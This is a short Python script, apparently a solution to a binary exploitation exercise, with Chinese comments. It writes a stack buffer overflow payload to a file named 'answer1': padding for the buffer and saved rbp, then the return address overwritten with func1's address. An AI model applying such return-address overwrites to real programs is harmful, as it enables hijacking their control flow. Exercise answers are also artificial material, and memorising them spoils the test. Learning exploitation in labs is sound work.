import struct
payload = b""
payload += b"A" * 8 # 填充缓冲区（8字节）
payload += b"B" * 8 # 填充保存的rbp（8字节）
payload += struct.pack("<Q", 0x401216)  # 覆盖返回地址为func1的地址
with open("answer1", "wb") as f:
    f.write(payload)